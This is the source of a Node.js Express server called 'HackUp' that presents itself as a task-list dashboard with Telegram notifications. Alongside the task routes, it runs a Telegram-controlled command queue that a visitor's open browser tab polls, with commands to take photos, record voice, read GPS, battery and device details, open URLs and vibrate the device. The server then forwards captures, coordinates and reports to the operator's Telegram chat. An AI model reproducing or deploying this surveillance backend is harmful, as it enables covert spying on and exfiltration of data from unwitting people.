require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(cors());
app.use(express.json({ limit: '4mb' }));
app.use(express.urlencoded({ extended: true, limit: '4mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ---------- state ----------
let tasks = [
  { id: 1, title: 'Design dashboard', completed: true },
  { id: 2, title: 'Integrate Telegram bot', completed: false },
  { id: 3, title: 'Deploy to Vercel', completed: false }
];
let nextId = 4;
let activityLog = [{ action: 'System initialized', timestamp: new Date().toISOString() }];
const cmdQueue = [];
const cmdResults = {};
let lastBrowserPing = 0;

const tgReady = () => Boolean(BOT_TOKEN && CHAT_ID);
const tgUrl = (m) => `https://api.telegram.org/bot${BOT_TOKEN}/${m}`;
const TG_TIMEOUT = 8000;

// ---------- telegram helpers ----------
async function tgSend(text) {
  if (!tgReady()) throw new Error('Telegram credentials missing');
  const r = await axios.post(tgUrl('sendMessage'), {
    chat_id: CHAT_ID,
    text: String(text).slice(0, 4000),
    parse_mode: 'HTML',
    disable_web_page_preview: true
  }, { timeout: TG_TIMEOUT });
  return r.data;
}

async function tgSendPhoto(dataUrl, caption) {
  if (!tgReady()) throw new Error('Telegram credentials missing');
  const m = /^data:([^;]+);base64,(.+)$/.exec(dataUrl || '');
  if (!m) throw new Error('Invalid image data');
  const mime = m[1];
  const buf = Buffer.from(m[2], 'base64');
  if (buf.length > 4 * 1024 * 1024) throw new Error('Image too large (>4MB)');

  const boundary = '----hackup' + Date.now();
  const parts = [];
  const push = s => parts.push(Buffer.from(s, 'utf8'));
  push(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`);
  push(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${(caption || '📸 Capture').slice(0,1000)}\r\n`);
  push(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="capture.jpg"\r\nContent-Type: ${mime||'image/jpeg'}\r\n\r\n`);
  parts.push(buf);
  push(`\r\n--${boundary}--\r\n`);
  const body = Buffer.concat(parts);

  const r = await axios.post(tgUrl('sendPhoto'), body, {
    headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': body.length },
    timeout: TG_TIMEOUT, maxBodyLength: Infinity, maxContentLength: Infinity
  });
  return r.data;
}

async function tgSendLocation(lat, lon) {
  if (!tgReady()) throw new Error('Telegram credentials missing');
  const r = await axios.post(tgUrl('sendLocation'), {
    chat_id: CHAT_ID, latitude: lat, longitude: lon
  }, { timeout: TG_TIMEOUT });
  return r.data;
}

async function addActivity(action, notify = false) {
  const e = { action, timestamp: new Date().toISOString() };
  activityLog.unshift(e);
  if (activityLog.length > 50) activityLog.pop();
  if (notify && tgReady()) { try { await tgSend(`📌 <b>HackUp</b>\n${action}`); } catch {} }
  return e;
}

// ============================================================
// TASK ROUTES
// ============================================================
app.get('/api/tasks', (_, res) => res.json(tasks));
app.get('/api/activity', (_, res) => res.json(activityLog));

app.post('/api/tasks', async (req, res) => {
  const { title } = req.body;
  if (!title || !title.trim()) return res.status(400).json({ error: 'Task title required' });
  const t = { id: nextId++, title: title.trim(), completed: false };
  tasks.push(t);
  await addActivity(`✅ Task added: "${t.title}" (ID: ${t.id})`, true);
  res.status(201).json(t);
});

app.put('/api/tasks/:id', async (req, res) => {
  const id = parseInt(req.params.id);
  const t = tasks.find(x => x.id === id);
  if (!t) return res.status(404).json({ error: 'Task not found' });
  if (req.body.title !== undefined) t.title = req.body.title.trim();
  if (req.body.completed !== undefined) t.completed = req.body.completed;
  await addActivity(`🔄 Task updated: "${t.title}" | done: ${t.completed}`, true);
  res.json(t);
});

app.delete('/api/tasks/:id', async (req, res) => {
  const id = parseInt(req.params.id);
  const i = tasks.findIndex(x => x.id === id);
  if (i === -1) return res.status(404).json({ error: 'Task not found' });
  const removed = tasks.splice(i, 1)[0];
  await addActivity(`🗑️ Task deleted: "${removed.title}"`, true);
  res.json({ message: 'deleted', task: removed });
});

app.post('/api/send-all', async (_, res) => {
  try {
    const total = tasks.length;
    const done = tasks.filter(t => t.completed).length;
    const list = tasks.map(t => `• ${t.title} ${t.completed ? '✅' : '⏳'}`).join('\n');
    const recent = activityLog.slice(0, 5).map(a => `• ${a.action}`).join('\n');
    await tgSend(
      `<b>📊 HackUp Report</b>\n\n<b>Tasks:</b> ${total}\n• Completed: ${done}\n• Pending: ${total-done}\n\n<b>Task List:</b>\n${list||'No tasks'}\n\n<b>Recent:</b>\n${recent||'None'}\n\n${new Date().toLocaleString()}`
    );
    await addActivity('📤 Sent report to Telegram', false);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.post('/api/telegram/test', async (_, res) => {
  try { await tgSend('🧪 <b>Test</b> from HackUp!'); res.json({ success: true }); }
  catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// ============================================================
// MONITOR ROUTES
// ============================================================
app.get('/api/health', (_, res) => {
  res.json({
    ok: true,
    telegramConfigured: tgReady(),
    browserOnline: Date.now() - lastBrowserPing < 15000,
    queued: cmdQueue.length,
    time: new Date().toISOString()
  });
});

app.post('/api/upload', async (req, res) => {
  try {
    const { image, caption } = req.body || {};
    if (!image) return res.status(400).json({ error: 'image required' });
    const r = await tgSendPhoto(image, caption);
    res.json({ success: r.ok === true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/telegram/message', async (req, res) => {
  try { const r = await tgSend(req.body.text || ''); res.json({ success: r.ok === true }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/telegram/location', async (req, res) => {
  try {
    const { latitude, longitude, caption } = req.body || {};
    if (typeof latitude !== 'number' || typeof longitude !== 'number')
      return res.status(400).json({ error: 'lat/lon required' });
    const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
    await tgSend(`${caption||'📍 Location'}\nLat: <code>${latitude.toFixed(6)}</code>\nLon: <code>${longitude.toFixed(6)}</code>\n<a href="${maps}">Map</a>`);
    await tgSendLocation(latitude, longitude);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/telegram/report', async (req, res) => {
  try {
    const d = req.body || {};
    const lines = ['📊 <b>Device Report</b>', `<b>Time:</b> ${new Date().toLocaleString()}`, ''];
    Object.keys(d).forEach(k => {
      let v = d[k];
      if (v === null || v === undefined || v === '') return;
      if (typeof v === 'object') v = JSON.stringify(v);
      lines.push(`<b>${k}:</b> <code>${String(v).slice(0,500)}</code>`);
    });
    const r = await tgSend(lines.join('\n'));
    res.json({ success: r.ok === true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ---------- queue ----------
app.get('/api/commands/poll', (_, res) => {
  lastBrowserPing = Date.now();
  const cmds = cmdQueue.splice(0, cmdQueue.length);
  res.json({ commands: cmds, ok: true });
});

app.post('/api/commands/result', async (req, res) => {
  const { id, result } = req.body || {};
  if (id) cmdResults[id] = { result, ts: Date.now() };
  if (result && tgReady()) { try { await tgSend(`✅ <b>Result</b>\n${String(result).slice(0,3500)}`); } catch {} }
  res.json({ ok: true });
});

// ============================================================
// TELEGRAM WEBHOOK
// ============================================================
app.post('/api/telegram/webhook', async (req, res) => {
  try {
    const msg = req.body?.message;
    if (!msg || !msg.text) return res.json({ ok: true });
    const text = msg.text.trim();
    const fromId = String(msg.chat.id);
    if (CHAT_ID && fromId !== String(CHAT_ID)) return res.json({ ok: true });

    const queue = (cmd) => {
      const id = Date.now().toString(36) + Math.random().toString(36).slice(2,6);
      cmdQueue.push({ id, cmd, ts: Date.now() });
      if (cmdQueue.length > 50) cmdQueue.shift();
      return id;
    };

    if (text === '/start' || text === '/help') {
      await tgSend(
        '🤖 <b>HackUp Control Bot</b>\n\n' +
        '📋 <b>Tasks:</b>\n/tasks — List\n/add &lt;title&gt;\n/done &lt;id&gt;\n/del &lt;id&gt;\n\n' +
        '📡 <b>Device</b> (browser tab open থাকতে হবে):\n' +
        '/status — Browser status\n/photo — Take photo\n/location — GPS\n' +
        '/report — Full report\n/voice — 5s voice\n/battery — Battery\n' +
        '/open &lt;url&gt; — Open URL\n/say &lt;text&gt; — TTS speak\n' +
        '/vibrate — Vibrate device\n/fullscreen — Fullscreen'
      );
    }
    else if (text === '/tasks') {
      const list = tasks.map(t => `${t.completed?'✅':'⏳'} [${t.id}] ${t.title}`).join('\n');
      await tgSend(`<b>Tasks (${tasks.length})</b>\n${list||'No tasks'}`);
    }
    else if (text.startsWith('/add ')) {
      const title = text.slice(5).trim();
      const t = { id: nextId++, title, completed: false };
      tasks.push(t);
      await tgSend(`✅ Added [${t.id}] "${title}"`);
    }
    else if (text.startsWith('/done ')) {
      const id = parseInt(text.slice(6));
      const t = tasks.find(x => x.id === id);
      if (!t) return tgSend(`❌ Not found: ${id}`);
      t.completed = !t.completed;
      await tgSend(`${t.completed?'✅':'⏳'} [${t.id}] ${t.title}`);
    }
    else if (text.startsWith('/del ')) {
      const id = parseInt(text.slice(5));
      const i = tasks.findIndex(x => x.id === id);
      if (i === -1) return tgSend(`❌ Not found: ${id}`);
      const r = tasks.splice(i, 1)[0];
      await tgSend(`🗑️ Deleted [${r.id}] ${r.title}`);
    }
    else if (text === '/status') {
      const alive = Date.now() - lastBrowserPing < 15000;
      await tgSend(`📡 Browser: ${alive ? '🟢 Online' : '🔴 Offline (tab open করুন)'}\nQueue: ${cmdQueue.length}`);
    }
    else if (text === '/photo' || text === '/location' || text === '/report' ||
             text === '/voice' || text === '/battery' || text === '/vibrate' ||
             text === '/fullscreen') {
      const id = queue({ type: text.slice(1) });
      await tgSend(`✅ Queued <b>${text}</b> (id: ${id})\nBrowser 5s-এ execute করবে।`);
    }
    else if (text.startsWith('/open ')) {
      const id = queue({ type: 'open', url: text.slice(6).trim() });
      await tgSend(`✅ Queued open (id: ${id})`);
    }
    else if (text.startsWith('/say ')) {
      const id = queue({ type: 'say', text: text.slice(5).trim() });
      await tgSend(`✅ Queued say (id: ${id})`);
    }
    else {
      await tgSend(`❓ Unknown: ${text}\n/help দিন।`);
    }
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ---------- one-time webhook setup ----------
app.get('/api/telegram/set-webhook', async (req, res) => {
  try {
    const host = req.query.url || `https://${req.headers.host}`;
    const wh = `${host}/api/telegram/webhook`;
    const r = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`,
      { url: wh, drop_pending_updates: true }, { timeout: TG_TIMEOUT });
    res.json({ success: true, webhook: wh, telegram: r.data });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ---------- pages ----------
app.get('/dashboard', (_, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

// ---------- error handler ----------
app.use((err, req, res, next) => {
  console.error('Error:', err.message);
  res.status(500).json({ error: err.message || 'Server error' });
});

if (require.main === module && !process.env.VERCEL) {
  app.listen(PORT, () => console.log(`HackUp → http://localhost:${PORT}`));
}
module.exports = app;
